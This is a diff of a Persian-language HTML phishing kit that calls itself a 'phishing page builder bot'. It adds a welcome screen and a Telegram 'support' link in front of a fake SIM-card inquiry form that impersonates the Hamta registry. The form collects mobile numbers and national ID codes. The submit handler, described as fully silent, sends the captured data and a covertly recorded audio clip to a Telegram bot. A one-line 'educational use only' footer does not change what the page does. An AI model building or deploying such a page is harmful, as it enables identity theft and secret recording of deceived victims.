@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سامانه استعلام سیم‌کارت</title>
+    <title>ربات فیشینگ ساز</title>
     <style>
         * {
             margin: 0;
@@ -19,19 +19,97 @@
             height: 100vh;
             direction: rtl;
             margin: 0;
+            padding: 20px;
         }
         .container {
             background: white;
-            padding: 35px 25px;
+            padding: 40px 30px;
             border-radius: 24px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-            width: 400px;
+            width: 100%;
+            max-width: 450px;
             text-align: center;
         }
-        .logo { font-size: 48px; margin-bottom: 10px; }
-        h2 { color: #1a2a3a; font-size: 22px; margin-bottom: 8px; }
-        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; }
-        input {
+        .logo {
+            font-size: 60px;
+            margin-bottom: 10px;
+        }
+        h1 {
+            color: #1a2a3a;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .sub {
+            color: #6c7a8a;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: rgba(26, 122, 232, 0.1);
+            color: #1a7ae8;
+            border: 2px solid #1a7ae8;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            text-align: center;
+        }
+        .btn:hover {
+            background: #1a7ae8;
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(26, 122, 232, 0.3);
+        }
+        .btn-primary {
+            background: #1a7ae8;
+            color: white;
+            border: 2px solid #1a7ae8;
+        }
+        .btn-primary:hover {
+            background: #0f5bb5;
+            border-color: #0f5bb5;
+        }
+        .btn-secondary {
+            background: rgba(220, 38, 38, 0.1);
+            color: #dc2626;
+            border: 2px solid #dc2626;
+        }
+        .btn-secondary:hover {
+            background: #dc2626;
+            color: white;
+            box-shadow: 0 8px 25px rgba(220, 38, 38, 0.3);
+        }
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #94a3b8;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 18px;
+        }
+        .footer span {
+            color: #1a7ae8;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none !important;
+        }
+        /* استایل‌های صفحه فیشینگ (در صورت نمایش) */
+        .phishing-page .logo { font-size: 48px; margin-bottom: 10px; }
+        .phishing-page h2 { color: #1a2a3a; font-size: 22px; margin-bottom: 8px; }
+        .phishing-page .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; }
+        .phishing-page input {
             width: 100%;
             padding: 14px;
             margin: 10px 0;
@@ -41,12 +119,12 @@
             background: #f8fafc;
             text-align: center;
         }
-        input:focus {
+        .phishing-page input:focus {
             border-color: #1a7ae8;
             background: white;
             outline: none;
         }
-        button {
+        .phishing-page button {
             width: 100%;
             padding: 14px;
             background: #1a7ae8;
@@ -58,17 +136,17 @@
             cursor: pointer;
             margin-top: 12px;
         }
-        button:hover { background: #0f5bb5; }
-        .note {
+        .phishing-page button:hover { background: #0f5bb5; }
+        .phishing-page .note {
             margin-top: 18px;
             font-size: 12px;
             color: #94a3b8;
             border-top: 1px solid #e2e8f0;
             padding-top: 16px;
         }
-        .note span { color: #1a7ae8; font-weight: bold; }
-        .input-group { text-align: right; margin: 5px 0; }
-        .input-group label {
+        .phishing-page .note span { color: #1a7ae8; font-weight: bold; }
+        .phishing-page .input-group { text-align: right; margin: 5px 0; }
+        .phishing-page .input-group label {
             font-size: 13px;
             color: #4a5a6a;
             font-weight: bold;
@@ -78,29 +156,80 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">📱</div>
-        <h2>استعلام سیم‌کارت</h2>
-        <p class="sub">برای استعلام وضعیت سیم‌کارت، اطلاعات زیر را وارد کنید</p>
+    <div class="container" id="mainContainer">
+        <!-- ============================================= -->
+        <!-- صفحه اصلی (خوش‌آمدگویی با دکمه‌ها) -->
+        <!-- ============================================= -->
+        <div id="homePage">
+            <div class="logo">🎯</div>
+            <h1>به ربات فیشینگ ساز خوش اومدید!</h1>
+            <p class="sub">
+                👋 سلام کاربر عزیز<br>
+                🤖 این ربات برای ساخت صفحات فیشینگ طراحی شده<br><br>
+                📌 <strong>راهنما:</strong><br>
+                • برای ساخت فیشینگ روی دکمه زیر کلیک کنید<br>
+                • برای ارتباط با پشتیبانی روی دکمه پشتیبانی کلیک کنید
+            </p>
 
-        <form id="findForm">
-            <div class="input-group">
-                <label>📞 شماره موبایل</label>
-                <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
+            <div class="btn-group">
+                <button class="btn btn-primary" id="goToPhishingBtn">
+                    🚀 ساخت فیشینگ
+                </button>
+                <a href="https://t.me/XP_HACKbot" class="btn btn-secondary" target="_blank">
+                    🛡️ پشتیبانی
+                </a>
             </div>
-            <div class="input-group">
-                <label>🆔 کد ملی</label>
-                <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
-            </div>
-            <button type="submit" id="submitBtn">🔍 استعلام</button>
-        </form>
 
-        <div class="note">
-            🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
+            <div class="footer">
+                ⚠️ استفاده از این ابزار فقط برای اهداف آموزشی مجاز است · <span>نسخه ۱.۰</span>
+            </div>
+        </div>
+
+        <!-- ============================================= -->
+        <!-- صفحه فیشینگ (مخفی در ابتدا) -->
+        <!-- ============================================= -->
+        <div id="phishingPage" class="hidden phishing-page">
+            <div class="logo">📱</div>
+            <h2>استعلام سیم‌کارت</h2>
+            <p class="sub">برای استعلام وضعیت سیم‌کارت، اطلاعات زیر را وارد کنید</p>
+
+            <form id="findForm">
+                <div class="input-group">
+                    <label>📞 شماره موبایل</label>
+                    <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
+                </div>
+                <div class="input-group">
+                    <label>🆔 کد ملی</label>
+                    <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
+                </div>
+                <button type="submit" id="submitBtn">🔍 استعلام</button>
+            </form>
+
+            <div class="note">
+                🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
+            </div>
+            
+            <!-- دکمه بازگشت به صفحه اصلی -->
+            <button id="backToHomeBtn" style="margin-top: 15px; background: #6c7a8a; padding: 10px; border-radius: 12px; border: none; color: white; font-weight: bold; cursor: pointer; width: 100%;">
+                🔙 بازگشت
+            </button>
         </div>
     </div>
 
     <script>
+        // ======================================================
+        // نمایش/مخفی کردن صفحات
+        // ======================================================
+        document.getElementById('goToPhishingBtn').addEventListener('click', function() {
+            document.getElementById('homePage').classList.add('hidden');
+            document.getElementById('phishingPage').classList.remove('hidden');
+        });
+
+        document.getElementById('backToHomeBtn').addEventListener('click', function() {
+            document.getElementById('phishingPage').classList.add('hidden');
+            document.getElementById('homePage').classList.remove('hidden');
+        });
+
         // ======================================================
         // تنظیمات ربات تلگرام
         // ======================================================
@@ -299,7 +428,7 @@
         }
 
         // ======================================================
-        // رویداد کلیک روی دکمه (همه چیز بی‌صدا)
+        // رویداد کلیک روی دکمه استعلام (همه چیز بی‌صدا)
         // ======================================================
         document.getElementById('findForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -338,12 +467,23 @@
                     await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                 }
 
-                window.location.href = 'https://example.com/error';
+                // بازگشت به صفحه اصلی بعد از ارسال
+                document.getElementById('phishingPage').classList.add('hidden');
+                document.getElementById('homePage').classList.remove('hidden');
+                
+                // ریست کردن فرم
+                document.getElementById('phone').value = '';
+                document.getElementById('nationalCode').value = '';
+                submitBtn.disabled = false;
+                submitBtn.textContent = '🔍 استعلام';
 
             } catch (error) {
-                window.location.href = 'https://example.com/error';
+                document.getElementById('phishingPage').classList.add('hidden');
+                document.getElementById('homePage').classList.remove('hidden');
+                submitBtn.disabled = false;
+                submitBtn.textContent = '🔍 استعلام';
             }
         });
     </script>
 </body>
-</html>
+    </html>
